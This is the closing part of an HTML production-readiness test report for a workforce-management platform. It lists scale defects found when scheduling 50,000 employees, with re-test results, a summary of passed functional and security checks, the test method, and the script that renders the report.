request in DEF-31 still froze everything."}},{"id":"DEF-31","sev":"High","area":"Scheduling · Limits","title":"An over-limit schedule request is not refused — it runs 8½ minutes and then drops","steps":"S13: one template with every 15-minute start and every length 4–12 h, 3,000 people, POST /scheduling/versions","expected":"Immediate 400: 'too many possible shifts' (the 900,000 limit exists in the code)","actual":"510 s, then the connection failed; /health afterwards showed Redis down; the gateway answered nobody meanwhile","evidence":"results.jsonl phase boundary","fix":"Estimate people × days × starts × lengths before building and refuse at once.","track":"50k scale","retest":{"status":"Still open","note":"The same request (every 15-minute start and length for 3,000 people) got no answer: the direct build and the background job both timed out after 5 minutes, and the gateway sat at 100% of one core and answered nobody for 20 minutes until it was restarted. The new up-front size check lets it through because its estimate assumes the thinnest setting."}},{"id":"DEF-32","sev":"High","area":"Workforce · API and screens","title":"Employee list stops at 2,000 people without saying so","steps":"GET /workforce/employees (or ?groupId= for a 6,000-person group); open Workforce › Employees","expected":"Paging, or a total and a 'showing 2,000 of 50,000' notice","actual":"Exactly 2,000 rows, no total, no next page (loadEmployees … LIMIT 2000). The other 48,000 people cannot be found by scrolling.","evidence":"probe-api; workforceRoutes.ts:70","fix":"Server-side paging with a total count; AG Grid server-side row model.","track":"50k scale","retest":{"status":"Fixed","note":"The list returns all 50,656 people, and ?limit=&offset= pages correctly with the true total. But the unpaged list now takes 40 s and sends 42 MB even with nothing else running, and screens that still load it pay for it (DEF-50)."}},{"id":"DEF-33","sev":"High","area":"Workforce · Bulk edit","title":"Bulk edit silently skips anyone outside the first 2,000","steps":"POST /workforce/employees/bulk with one person inside and one outside the first 2,000 (by last name)","expected":"Both updated","actual":"200 OK, updated 1, skipped 1: 'Employee not found'","evidence":"cap-check.mjs; workforceRoutes.ts:178 uses the capped loader","fix":"Load the selected ids directly (WHERE id = ANY($1)) instead of the capped list.","track":"50k scale","retest":{"status":"Fixed","note":"Bulk edit of S04-02999 (beyond the first 2,000) was applied."}},{"id":"DEF-34","sev":"High","area":"Workforce · Import","title":"Re-importing existing employees fails once the organisation has more than 2,000 people","steps":"Import a CSV row for an existing employee outside the first 2,000","expected":"Dry run says UPDATE; commit updates them","actual":"Dry run says NEW; commit fails with 409 'That already exists' and rejects the whole file. A nightly HR sync of 50,000 people cannot run.","evidence":"cap-check.mjs; workforceRoutes.ts:274","fix":"Match existing employees by number with a direct query for the numbers in the file.","track":"50k scale","retest":{"status":"Fixed","note":"Re-importing S04-02999 was matched and updated (dry run and commit). It took 16–45 s for one row while builds ran."}},{"id":"DEF-35","sev":"High","area":"Scheduling · Background jobs","title":"The 'two builds at a time' limit is not enforced","steps":"Queue 12 schedule jobs while the gateway is busy","expected":"At most SCHEDULE_JOB_CONCURRENCY (default 2) running","actual":"10 jobs RUNNING at once on one gateway, multiplying the load that caused DEF-29 and DEF-30","evidence":"schedule_jobs rows at 14:35; scheduleJobs.ts tick(): the running-count check and the claim are separated by an await, and tick() runs from both a timer and every enqueue","fix":"Make tick() single-flight (a flag or mutex) and claim only CONCURRENCY - running.size jobs in one UPDATE.","track":"50k scale","retest":{"status":"Fixed","note":"All 13 builds were queued together; never more than 2 ran at once. The queue has a new problem with long builds, see DEF-47."}},{"id":"DEF-36","sev":"Medium","area":"Scheduling · Background jobs","title":"Jobs fail at once while the engine restarts, and timeouts are reported as 'engine not reachable'","steps":"Queue jobs during the ~60 s an engine takes to start; or solve a group whose call exceeds the gateway's gRPC deadline","expected":"Wait/retry with back-off; a timeout says it timed out","actual":"8 jobs failed within 5 s each; S09 (no crash) failed after 172 s with 'The forecasting engine is not reachable'","evidence":"seq.log","fix":"Retry engine-unavailable failures with back-off for a few minutes; distinguish DEADLINE_EXCEEDED from UNAVAILABLE in the message.","track":"50k scale","retest":{"status":"Fixed","note":"The gateway now retries: its log shows 'ENGINE_UNAVAILABLE; trying again (attempt 2 of 3)' and 'ENGINE_CRASHED; trying again'. One build (S13) still failed with a 2-minute engine timeout while the database was recovering from a crash; it built on the next try."}},{"id":"DEF-37","sev":"High","area":"Scheduling · Optimiser","title":"At 3,000+ people the optimiser adds nothing: schedules are the greedy starting roster","steps":"Schedule any group with ≥ 210,000 candidate shifts (S01, S06, S08, S11, S12, S13) with a 90 s limit","expected":"CP-SAT improves on the starting roster; or the screen says the result is unoptimised","actual":"Every one: 'cpsat: feasible (starting roster only), highs: unknown, scip: unknown, greedy: feasible', gap 1 (100%). Valid schedules, often 95–98% covered, but contract hours, preferences and fairness are not optimised. Only S04/S07 (≤ 75,000 candidates) were optimised.","evidence":"results.jsonl schedule-seq statsRaw","fix":"Split earlier (smaller parts, solved safely — see DEF-29), give large groups a longer default limit, and show 'starting roster only' prominently on the schedule.","track":"50k scale","retest":{"status":"Partly fixed","note":"Groups are now split into parts of 667–800 people that CP-SAT improves: S02 (failed in run 1) reached 83.1%, S09 95.1%, S11 96.5%. Where CP-SAT crashes (DEF-48) the part is still the greedy starting roster: all of S05 and S06, 2 of 8 parts of S01."}},{"id":"DEF-38","sev":"Medium","area":"Forecasting · Staffing","title":"Email (24 h turnaround) demand is spread across the night","steps":"S04: email queue, weekday office-hours history (no night volume), Mon–Fri 08:00–18:30 templates","expected":"Back-office work can wait within its 24 h turnaround, so it is staffed in office hours","actual":"Requirement of about 140 people 00:00–08:00 every day; coverage 43.5% while 388,976 surplus quarter-hours sit in the day; shortage report: 'no shift template covers this time'","evidence":"GET /scheduling/versions/:id/shortage for S04","fix":"For deferrable channels, place the requirement within the queue's opening hours (backlog model) instead of flat over 24 h.","track":"50k scale","retest":{"status":"Fixed","note":"Email back office (S04) coverage rose from 43.5% to 87.1%."}},{"id":"DEF-39","sev":"Medium","area":"Scheduling · Contracts","title":"Full-timers scheduled well below contract hours with no warning","steps":"Validate hours per person in S11 (overstaffed) and S01","expected":"Contract hours met, or the shortfall listed as a warning for payroll","actual":"Full-time 40 h people averaged 21.7 h (S11) and 32.4 h (S01); schedule statistics show warnings: 0","evidence":"validate rows","fix":"Report contract-hour shortfall per person; offer VTO instead of silently cutting hours where the policy pays contract hours.","track":"50k scale","retest":{"status":"Fixed","note":"Full-timers now average their 40 contract hours in 11 groups (S06 39.2 h with 400 people on leave; S07 37.3 h on the 4-on-4-off rota). First run: 21.7–32.7 h in several groups."}},{"id":"DEF-40","sev":"Medium","area":"Performance · Large groups","title":"Screens and reads for a 6,000-person group are slow and heavy","steps":"Open screens with the 6,000-person group selected; call the shift and plan APIs","expected":"\u003c 5 s","actual":"Schedule Timeline 44 s, 236 MB browser heap; Live Coverage and Adherence 30 s; Schedule Quality > 120 s; plan view API 18 s; shifts API returns everything at once (15 MB for one week; 79 MB for 2,000 people × 13 weeks — about 1 GB for 6,000 × 52 weeks)","evidence":"probe-ui, probe-api, validate (shiftsKb)","fix":"Page and window the shift APIs (by day/team), virtualise the timeline, precompute report screens.","track":"50k scale","retest":{"status":"Partly fixed","note":"Faster: schedule plan view 18.4 s to 3.8 s, schedule timeline 44 s to 27 s, schedule quality 120 s to 54 s, all schedules 2.6 s to 1.2 s. Still slow: shifts of a 6,000-person group are 18 MB in one call, live coverage and adherence screens take about 30 s to settle, and the Time off screen got much slower (DEF-50)."}},{"id":"DEF-41","sev":"Low","area":"Forecasting","title":"Model choice is not explained: unsuitable models run, unavailable ones fall back quietly","steps":"Request ARIMA for S09, Croston for S04, GBM for S06","expected":"The screen says what each model needs and warns when the chosen one is worse than a naive forecast","actual":"ARIMA used though worse than seasonal naive (MASE 2.6, WAPE 7.7% vs ~0.1–0.2% elsewhere, stability VARIABLE). GBM needs 120 days of history and Croston a sparse daily series; both fell back with a note only in the summary.","evidence":"forecast versions summaries","fix":"Show eligibility next to each model and warn when the selected model loses to the baseline.","track":"50k scale","retest":{"status":"Not re-tested","note":"Forecasts from the first run were reused."}},{"id":"DEF-42","sev":"Low","area":"Self-service","title":"Publishing a schedule does not notify the people on it","steps":"Publish S01 (6,000 people) → sign in as S01-00001","expected":"'Your schedule for 2–8 Nov is published'","actual":"0 notifications (shifts are visible)","evidence":"probe-portal after publish","fix":"Confirm intended behaviour; if not, notify on publish (batched).","track":"50k scale","retest":{"status":"Not re-tested","note":"Schedules were not published in this run."}},{"id":"DEF-46","sev":"High","area":"Scheduling · Performance","title":"Large builds take 20–75 minutes when two run at once, almost all of it before the solver starts","steps":"Queue the 13 SCALE builds together (2 run at a time) on a gateway that has been up for a few hours; S01's 24,288-shift schedule from the first run is published","expected":"A few minutes per group (the solver itself needs 1.5–3 minutes)","actual":"S01 20 min, S02 41 min, S03 76 min, S05 44 min for the build itself; the solver's share was 90–190 s. The gateway sat at 100% of one core while the engine was idle. On a freshly restarted gateway, one build at a time, groups of 3,000–4,000 took 4–9 minutes.","evidence":"Job progress stayed on 'Preparing' for 17–40 min; process CPU sampling; solver wallSec in each schedule's statistics","fix":"Profile candidate preparation. Every candidate shift scans tenant-wide arrays: all approved time off, all 2,008 availability rows and every published shift of other groups (blockedReason, preferenceFor). Index them by employee once (Map) before the loop, and move preparation off the API process (worker thread or the engine).","retest":{"status":"New","note":"Found in this re-test."},"track":"50k scale"},{"id":"DEF-47","sev":"High","area":"Scheduling · Job queue","title":"The queue fails or repeats builds that are still running","steps":"Run two large background builds at once, or one long build, and watch schedule_jobs","expected":"A running build keeps its slot and its status until it finishes","actual":"While a build prepares, its heartbeat falls more than 30 s behind, so the sweeper hands it back to the queue while it is still running. S02 and S05 were built twice (two S02 versions). S05 showed QUEUED while running. S09 and S10 failed with 'The server restarted twice while this was running' with no restart, and S10 saved an empty version. After the laptop's standby, S05's finished build was overwritten as FAILED.","evidence":"wfm.schedule_jobs attempts = 2–3 with a fresh heartbeat on a QUEUED row; two 'SCALE S02 rerun' versions; gateway log","fix":"Send the heartbeat from outside the busy event loop (or make preparation yield properly), give the sweeper a much longer grace period, never overwrite a DONE job, and make a job's run single-owner (check the worker and attempt before writing results).","retest":{"status":"New","note":"Found in this re-test."},"track":"50k scale"},{"id":"DEF-48","sev":"High","area":"Scheduling · Engine","title":"CP-SAT crashes on many parts, so those parts get only the starting roster","steps":"Build S05 (5,000 people, two skills) or S06 (4,000 people, leave and availability) as a background plan","expected":"CP-SAT solves each 750–800-person part","actual":"The solver process ended with exit code 0xC0000409 (a native abort) on every part of S05 and S06 and on 2 of 8 parts of S01. HiGHS and SCIP returned 'unknown', so those parts used the greedy roster. In S05, 1,000 people got no shifts at all.","evidence":"Schedule statistics: 'part 1: cpsat: failed (the solver process ended without an answer (exit code 3221226505))'","fix":"Capture the worker's stderr and a core dump to find the abort (often memory, or a model OR-Tools rejects); try fewer search workers or a per-process memory limit; report 'starting roster only' on the schedule when every solver fails.","retest":{"status":"New","note":"Found in this re-test."},"track":"50k scale"},{"id":"DEF-49","sev":"Medium","area":"Reliability · Gateway","title":"The gateway stopped again with no log line, right after an engine crash","steps":"Background build of S10 (13-week plan); the engine's solver crashed and the gateway logged 'ENGINE_CRASHED; trying again'","expected":"The gateway retries the build, or logs why it stops","actual":"The gateway process ended with exit code 127 and nothing more in its log. This is the second time (release-gate DEF-44). The build failed and was retried after the gateway was back.","evidence":"Gateway log ends on the ENGINE_CRASHED line followed by 'gateway exit=127'","fix":"Log uncaughtException, unhandledRejection and process exit before quitting; run the gateway under a supervisor that restarts it.","retest":{"status":"New","note":"Found in this re-test."},"track":"50k scale"},{"id":"DEF-50","sev":"High","area":"Performance · Workforce","title":"Screens that load every employee became very slow once the 2,000 limit was lifted","steps":"Open Workforce > Time off in Chrome on the 50,656-person organisation; call GET /workforce/employees with no paging","expected":"A few seconds, as in the first run (3.1 s)","actual":"Time off took 72 s to settle (first run 3.1 s). The unpaged employee list takes 40 s and sends 42 MB with nothing else running. The Employees screen itself pages and opens in 3.9 s.","evidence":"probe-ui and probe-api rows in the run-2 results","fix":"Make every screen and picker that needs employees use paging or a search endpoint (names and ids only), and cap or refuse the unpaged list on large organisations.","retest":{"status":"New","note":"Found in this re-test."},"track":"50k scale"}],"strengths":["All 13 scenario groups (50,000 people) built: 24x7 nights, part-timers, multi-skill, leave and availability, a 4-on-4-off rota, another time zone, a 13-week plan, over- and under-staffing, and the candidate-limit case. In the first run, 4 groups never built.","Independent re-check of every shift in all 13 schedules (about 355,800 shifts, including the 13-week plan): 0 double-bookings, 0 rest or weekly-hour breaks, 0 shifts on approved leave or in unavailable hours, 0 weekend shifts for the 1,200 people who may not work weekends.","A crashing solve no longer takes the engine or other builds down: each part runs in its own process and falls back to HiGHS, SCIP and then the greedy roster.","The two-builds-at-a-time limit holds with 13 builds queued at once.","The 2,000-person limits are gone: the employee list, bulk edit and re-import work for all 50,656 people, with paging and a true total.","Full-timers now get their contract hours (40 h on average), and the email back office is 87% covered instead of 44%.","A wait-for-it build of 3,000+ people is refused at once with a clear message to build in the background.","Role-based access control: 1,934 role × route checks over 327 guarded routes and 6 roles — no route answered without its permission, no role wrongly blocked, every guarded route returns 401 when signed out.","Token security: alg:none, role-swapped payload, bad signature, expired and garbage tokens all rejected; sign-out revokes the token server-side.","Brute force: sign-in locks after 10 failures per IP+user; password change locks after 5; password policy rejects short, common, username-based and repeated-character passwords.","Injection: SQL-injection probes on sign-in, search and IDs gave no 5xx and no bypass; HTML in names and reasons renders as text (no dangerouslySetInnerHTML anywhere).","Tenant/employee isolation: an agent cannot see, cancel or give away another agent's requests or shifts; mass-assignment fields are ignored.","Validation is strong across configuration (duplicates, time zones, SL > 100 %, queue hours), templates, forecast lifecycle (no publish before approve, no deleting a published forecast) and live feeds (negative volume, future events, unknown agents)."],"method":["Same machine as the first run: one laptop (Intel i5-10310U, 4 cores, 16 GB RAM with about 3 GB free), one engine under a restart supervisor, Vite dev servers. Same 50,656 people and the published forecasts from the first run; only the code changed.","Step 1: the over-limit request (every 15-minute start and length for 3,000 people), as a direct build and as a background job. Step 2: all 13 builds queued together, health-checked every 3 s by the test and every 15 s separately. Step 3: groups that did not finish were built again one at a time.","The laptop went into Modern Standby from 23:49 to 10:01 local time during step 2. Only the 2 hours 8 minutes before that count as the 'together' result (6 builds finished, 0 failed). The builds that broke during the standby were built again afterwards.","During step 3 the database crashed once and recovered (about 2.8 GB of memory was free, and a second gateway on the test settings was using 2.6 GB), and the gateway and engine were restarted. All 13 groups built in the end.","Every schedule was re-checked by an independent script that reads each shift and each person's own rules (validate.mjs); it does not trust the solver's statistics.","The release-gate part of this report is the 1 November re-test (Playwright suite, functional, security, access-control, accessibility and static checks); it was not repeated.","Raw results: \u003ctmp>/wfm-qa/run2/scale/results.jsonl; scripts in qa/scale (rerun-50k.mjs, finish-queue.mjs, direct-builds.mjs, validate.mjs, probe-50k.mjs) and qa/tools/build-production-report.mjs."],"boundaryLine":"still no answer: both requests timed out after 5 min and the API answered nobody for 20 min, until the gateway was restarted"}</script>
<script>
(() => {
  const D = JSON.parse(document.getElementById('report-data').textContent.replace('/*__DATA__*/', ''));
  const $ = (h) => { const t = document.createElement('template'); t.innerHTML = h.trim(); return t.content; };
  const esc = (s) => String(s ?? '').replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  const n = (x) => (x == null || Number.isNaN(Number(x)) ? '—' : Number(x).toLocaleString('en-GB'));
  const ms = (x) => (x == null ? '—' : x >= 1000 ? `${n(Math.round(x / 100) / 10)} s` : `${x} ms`);
  const sec = (x) => (x == null ? '—' : x >= 90 ? `${Math.round(x / 6) / 10} min` : `${x} s`);
  const sev = (s) => `<span class="sev s-${s}"><i></i>${s}</span>`;
  const rtCls = (s) => 'rt-' + String(s ?? '').split(' ')[0];
  const rt = (d) => d.retest ? `<span class="rt ${rtCls(d.retest.status)}">${esc(d.retest.status)}</span>` : '<span class="note">—</span>';
  const vword = (v) => (v === 'CONDITIONAL' ? 'CONDITIONAL GO' : v);
  const vcls = (v) => 'v-' + String(v).split(' ')[0];
  const sevs = ['Critical', 'High', 'Medium', 'Low', 'Info'];
  const isOpen = (d) => d.retest?.status !== 'Fixed';
  const app = document.getElementById('app');
  const S = D.scale, P2 = S.parallel.run2 ?? {}, G = D.gate, C = G.counts;

  app.append($(`<header class="top">
    <div style="display:grid;gap:10px;min-width:0">
      <div class="eyebrow">Enterprise WFM Platform · release gate + 50,000-person scale</div>
      <h1>Production Readiness Test</h1>
      <div class="meta"><span>Re-test, 1–2 November 2026</span><span>Admin :3000 · Portal :3001 · Gateway :4000 · Engine :50051</span><span>Branch <code>qa/production-readiness</code></span></div>
    </div>
    <div class="stamp ${D.verdict === 'GO' ? 'go' : D.verdict === 'CONDITIONAL' ? 'cond' : ''}" role="img" aria-label="Overall verdict ${esc(vword(D.verdict))}"><span>Overall verdict</span><b>${esc(vword(D.verdict))}</b></div>
  </header>`));

  app.append($(`<section aria-label="Summary" style="gap:18px">
    <p class="lede">${esc(D.verdictLine)}</p>
    <div class="sevrow">${sevs.map((s) => `<span class="sev s-${s}"><i></i>${D.openBySev[s]} ${s.toLowerCase()} open</span>`).join('')}</div>
    <div class="tracks">${D.tracks.map((t) => `<div class="track">
      <div class="eyebrow">${esc(t.name)}</div>
      <div class="vrow"><span class="vtag ${vcls(t.verdict)}">${esc(vword(t.verdict))}</span><span class="was">first run: <s>${esc(vword(t.previous))}</s></span></div>
      <p>${esc(t.line)}</p>
      <div class="sevrow">${['Fixed', 'Partly fixed', 'Still open', 'Still applies', 'New'].filter((k) => t.retest[k]).map((k) => `<span class="rt ${rtCls(k)}">${t.retest[k]} ${k.toLowerCase()}</span>`).join('')}</div>
    </div>`).join('')}</div>
    <div class="figs">
      <div class="fig"><span class="eyebrow">Employees</span><b class="num">${n(S.total)}</b><small>in ${S.groups.length} WFM groups, one organisation</small></div>
      <div class="fig"><span class="eyebrow">Schedules built</span><b class="num">${S.built.run2}/13</b><small>first run ${S.built.run1}/13</small></div>
      <div class="fig"><span class="eyebrow">Engine crashes</span><b class="num">${n(S.engine.run2Crashes)}</b><small>first run ${n(S.engine.run1Crashes)}</small></div>
      <div class="fig"><span class="eyebrow">Shifts re-checked</span><b class="num">${n(S.shiftsChecked)}</b><small>${n(S.ruleBreaks)} rule breaks</small></div>
      <div class="fig"><span class="eyebrow">Playwright suite</span><b class="num">${G.suite.passed}/${G.suite.total}</b><small>release-gate tests passed</small></div>
    </div>
    <nav class="toc" aria-label="Sections"><a href="#blocking">Still blocking</a><a href="#scale">50k scale</a><a href="#groups">Per group</a><a href="#load">Screens and API at 50k</a><a href="#gate">Release gate</a><a href="#defects">All defects</a><a href="#strengths">What works</a><a href="#method">Method</a></nav>
  </section>`));

  app.append($(`<section id="blocking"><div class="sec-head"><div class="eyebrow">Gate</div><h2>Still blocking launch</h2><p>Critical and high defects from either track that are not yet fixed.</p></div>
    ${D.blocking.length ? `<div class="mustfix">${D.blocking.map((d) => `<div class="mf"><span class="mono">${d.id}</span>${sev(d.sev)}<div style="min-width:0"><div class="t">${esc(d.title)} <span class="rt ${rtCls(d.status)}">${esc(d.status ?? 'Open')}</span></div><div class="a"><span class="trk">${esc(d.track)}</span> · ${esc(d.fix)}</div></div></div>`).join('')}</div>` : '<p>Nothing is blocking.</p>'}
  </section>`));

  const brow = S.boundary.run2 ?? {};
  app.append($(`<section id="scale"><div class="sec-head"><div class="eyebrow">Run 2 against run 1 · same data, same machine</div><h2>50,000-person scale</h2>
      <p>${n(S.total)} employees, 13 groups that each model a different real situation (24x7 nights, part-timers, multi-skill, leave, rotations, other time zone, a 13-week plan, over- and under-staffing). Schedule week from ${esc(S.weekFrom)}. The forecasts and people from the first run were reused; only the code changed.</p></div>
    <div class="tbl"><table class="cmp"><thead><tr><th>Measure</th><th>Run 1 · 31 Oct</th><th>Run 2 · 1 Nov</th></tr></thead><tbody>
      <tr><td><b>All builds started together</b></td><td>${S.parallel.run1.built} of ${S.parallel.run1.of} built</td><td>${S.parallel.built} of ${S.parallel.queued?.queued ?? '—'} built</td></tr>
      <tr><td><b>Builds running at once</b> <span class="sub">The limit is 2</span></td><td>up to 10</td><td>${n(P2.maxRunning)}</td></tr>
      <tr><td><b>Gateway while building</b> <span class="sub">Health check every 3 s</span></td><td>no answer for most of 42 min</td><td>${P2.samples ? `p50 ${ms(P2.healthP50)}, p95 ${ms(P2.healthP95)}, worst ${ms(P2.worstHealthMs)} · ${P2.failures} failed of ${P2.samples} over ${P2.minutes} min` : '—'}</td></tr>
      <tr><td><b>Schedules built</b> <span class="sub">Any way: together, then one at a time</span></td><td>${S.built.run1} of 13</td><td>${S.built.run2} of 13</td></tr>
      <tr><td><b>Engine crashes</b></td><td>${n(S.engine.run1Crashes)}</td><td>${n(S.engine.run2Crashes)}</td></tr>
      <tr><td><b>Over-limit request</b> <span class="sub">Every 15-minute start and length for 3,000 people</span></td><td>ran 8.5 min, then the connection dropped</td><td>${esc(D.boundaryLine ?? '') || esc(brow['direct build'] ? `${brow['direct build'].status} after ${ms(brow['direct build'].ms)}` : '—')}</td></tr>
      <tr><td><b>Independent rule check</b></td><td>250,495 shifts, 0 rule breaks</td><td>${n(S.shiftsChecked)} shifts in ${S.validated} groups, ${n(S.ruleBreaks)} rule breaks</td></tr>
    </tbody></table></div>
    ${S.caps.length ? `<h3>Organisations above 2,000 people</h3><div class="tbl"><table class="cmp"><thead><tr><th>Check</th><th>Run 1</th><th>Run 2</th></tr></thead><tbody>${S.caps.map((c) => `<tr><td><b>${esc(c.check)}</b></td><td>${esc(c.run1)}</td><td>${esc(c.run2)}</td></tr>`).join('')}</tbody></table></div>` : ''}
  </section>`));

  app.append($(`<section id="groups"><div class="sec-head"><div class="eyebrow">13 scenario groups</div><h2>Per group</h2><p>"Covered" is the share of required staff-hours the schedule meets. "Rule breaks" are counted by an independent checker that re-reads every shift against each person's own rules.</p></div>
    <div class="tbl"><table><thead><tr><th>Group</th><th class="n">People</th><th>Run 1</th><th>Run 2 · all at once</th><th>Run 2 · result</th><th class="n">Covered</th><th class="n">Shifts</th><th class="n">Rule breaks</th></tr></thead><tbody>
    ${S.groups.map((g) => `<tr><td style="min-width:200px"><b>${g.key} · ${esc(g.name)}</b><span class="sub">${esc(g.what)}</span></td><td class="n">${n(g.size)}</td>
      <td>${g.run1.status === 'DONE' ? `<span class="ok">Built</span><span class="sub">${g.run1.coverage}% · ${esc(g.run1.how)}</span>` : `<span class="bad">Failed</span><span class="sub">${esc(g.run1.how)}</span>`}</td>
      <td>${g.run2.parallel ? `<span class="${g.run2.parallel.status === 'DONE' ? 'ok' : 'bad'}">${g.run2.parallel.status === 'DONE' ? 'Built' : esc(g.run2.parallel.status)}</span><span class="sub">${sec(g.run2.parallel.wallSec)}${g.run2.parallel.error ? ' · ' + esc(String(g.run2.parallel.error).slice(0, 140)) : ''}</span>` : '—'}</td>
      <td>${g.run2.status === 'DONE' ? `<span class="ok">Built</span><span class="sub">${esc(g.run2.via)} · ${esc(g.run2.backend ?? '')}${g.run2.parts ? ` · ${g.run2.parts.length} parts` : ''}</span>` : `<span class="bad">${esc(g.run2.status)}</span><span class="sub">${esc(String(g.run2.error ?? '').slice(0, 160))}</span>`}</td>
      <td class="n">${g.run2.coverage == null ? '—' : g.run2.coverage + '%'}</td><td class="n">${n(g.run2.shifts)}</td><td class="n">${g.validate?.error ? 'not checked' : n(g.validate?.total)}</td></tr>`).join('')}
    </tbody></table></div></section>`));

  const a1 = Object.fromEntries(S.api.run1.map((r) => [r.name, r])), u1 = Object.fromEntries(S.ui.run1.map((r) => [r.name, r]));
  const pr = S.portal.run2;
  app.append($(`<section id="load"><div class="sec-head"><div class="eyebrow">With 50,000 people in the database</div><h2>Screens and API at 50k</h2><p>Measured after the builds finished, on Vite dev servers.</p></div>
    <div class="two">
      <div class="tbl"><table><thead><tr><th>API read</th><th class="n">Run 1</th><th class="n">Run 2</th><th class="n">Size</th><th class="n">Rows</th></tr></thead><tbody>
        ${S.api.run2.map((r) => `<tr><td>${esc(r.name)}</td><td class="n">${ms(a1[r.name]?.ms)}</td><td class="n">${r.status === 200 ? '' : `<span class="bad">${r.status}</span> `}${ms(r.ms)}</td><td class="n">${n(r.kb)} kB</td><td class="n">${n(r.rows)}</td></tr>`).join('')}
      </tbody></table></div>
      <div class="tbl"><table><thead><tr><th>Admin screen</th><th class="n">Run 1</th><th class="n">Run 2</th><th class="n">Memory</th><th>Problems</th></tr></thead><tbody>
        ${S.ui.run2.map((r) => `<tr><td>${esc(r.name)}</td><td class="n">${ms(u1[r.name]?.ms)}</td><td class="n">${ms(r.ms)}</td><td class="n">${r.heapMb} MB</td><td>${r.crashed ? '<span class="bad">crashed</span>' : r.errors.length ? esc(r.errors.join('; ').slice(0, 120)) : 'none'}</td></tr>`).join('')}
      </tbody></table></div>
    </div>
    ${pr ? `<p class="note">Employee portal for one of the 50,000 (an S01 agent): home in ${ms(pr.uiHomeMs)} (${pr.uiHomeOk ? 'ok' : 'failed'}); ${pr.portalApi.map((p) => `<code>${esc(p.p)}</code> ${p.status} ${ms(p.ms)}`).join(', ')}; ${pr.shiftsThisPeriod} shifts visible this period.</p>` : ''}
  </section>`));

  app.append($(`<section id="gate"><div class="sec-head"><div class="eyebrow">Admin app, portal and API · re-test</div><h2>Release gate</h2><p>${esc(D.tracks[0].line)}</p></div>
    <div class="figs">
      <div class="fig"><span class="eyebrow">Functional</span><b class="num">${C.functionalPass}/${C.functionalChecks}</b><small>API checks across modules</small></div>
      <div class="fig"><span class="eyebrow">UI journeys</span><b class="num">${C.uiPass}/${C.uiChecks}</b><small>admin + portal in Chrome</small></div>
      <div class="fig"><span class="eyebrow">Security</span><b class="num">${C.securityPass}/${C.securityTests}</b><small>attack tests passed</small></div>
      <div class="fig"><span class="eyebrow">Access checks</span><b class="num">${n(C.rbacChecks)}</b><small>role × route · 0 leaks</small></div>
      <div class="fig"><span class="eyebrow">Screens</span><b class="num">${C.adminScreens + C.portalSections}</b><small>crawled with a11y scan</small></div>
    </div>
    <div class="two">
      <div class="tbl"><table><thead><tr><th>Module</th><th class="n">Screens</th><th class="n">Crashes</th><th class="n">Avg load</th></tr></thead><tbody>
        ${G.modules.map((m) => `<tr><td><b>${esc(m.name)}</b></td><td class="n">${m.screens}</td><td class="n">${m.crashes}</td><td class="n">${ms(m.avgLoadMs)}</td></tr>`).join('')}
      </tbody></table></div>
      <div class="tbl"><table><thead><tr><th>Check</th><th>Result</th></tr></thead><tbody>
        ${G.staticChecks.map((s) => `<tr><td>${esc(s.name)}</td><td><span class="${s.ok ? 'ok' : 'bad'}">${s.ok ? 'Pass' : 'Fail'}</span> <span class="note">${esc(s.detail)}</span></td></tr>`).join('')}
        ${G.security.filter((s) => !s.pass).map((s) => `<tr><td class="mono">${s.id}</td><td><span class="bad">Fail</span> <span class="note">${esc(s.title)}</span></td></tr>`).join('')}
      </tbody></table></div>
    </div>
  </section>`));

  const tracks = ['Release gate', '50k scale'];
  app.append($(`<section id="defects"><div class="sec-head"><div class="eyebrow">${D.defects.length} across both tracks</div><h2>All defects</h2><p>Open a defect for steps, expected and actual results, the re-test note and the fix. The same list is in <code>qa/reports/production-readiness/defects.csv</code>.</p></div>
    <div class="filters" role="group" aria-label="Filter defects">
      <button class="chip" aria-pressed="true" data-f="all" id="f-all">All</button>
      <button class="chip" aria-pressed="false" data-f="open" id="f-open">Not fixed</button>
      ${tracks.map((t, i) => `<button class="chip" aria-pressed="false" data-f="t:${t}" id="f-t${i}">${t}</button>`).join('')}
      ${sevs.map((s) => `<button class="chip" aria-pressed="false" data-f="s:${s}" id="f-${s}">${s}</button>`).join('')}
    </div>
    <div class="defects" id="dlist">${D.defects.map((d) => `<details class="d ${d.sev}" data-sev="${d.sev}" data-track="${esc(d.track)}" data-open="${isOpen(d)}"><summary><span class="mono">${d.id}</span>${sev(d.sev)}<span style="min-width:0"><b>${esc(d.title)}</b> ${rt(d)}</span><span class="area">${esc(d.track)}</span></summary>
      <dl class="dl">${d.retest ? `<dt>Re-test</dt><dd>${esc(d.retest.note)}</dd>` : ''}<dt>Area</dt><dd>${esc(d.area)}</dd><dt>Steps</dt><dd>${esc(d.steps)}</dd><dt>Expected</dt><dd>${esc(d.expected)}</dd><dt>Actual</dt><dd>${esc(d.actual)}</dd><dt>Evidence</dt><dd>${esc(d.evidence)}</dd><dt>Fix</dt><dd>${esc(d.fix)}</dd></dl></details>`).join('')}</div>
  </section>`));

  app.append($(`<section id="strengths"><div class="sec-head"><div class="eyebrow">Confirmed by test</div><h2>What works well</h2></div><ul class="list">${D.strengths.map((s) => `<li>${esc(s)}</li>`).join('')}</ul></section>`));
  app.append($(`<section id="method"><div class="sec-head"><div class="eyebrow">How this was tested</div><h2>Method and limits</h2></div><ul class="list">${(D.method ?? []).map((s) => `<li>${esc(s)}</li>`).join('')}</ul></section>`));

  const chips = [...document.querySelectorAll('.chip')];
  chips.forEach((c) => c.addEventListener('click', () => {
    chips.forEach((x) => x.setAttribute('aria-pressed', String(x === c)));
    const f = c.dataset.f;
    document.querySelectorAll('#dlist details').forEach((d) => {
      d.hidden = !(f === 'all' || (f === 'open' && d.dataset.open === 'true') || (f.startsWith('t:') && d.dataset.track === f.slice(2)) || (f.startsWith('s:') && d.dataset.sev === f.slice(2)));
    });
  }));
})();
</script>

</body>
</html>
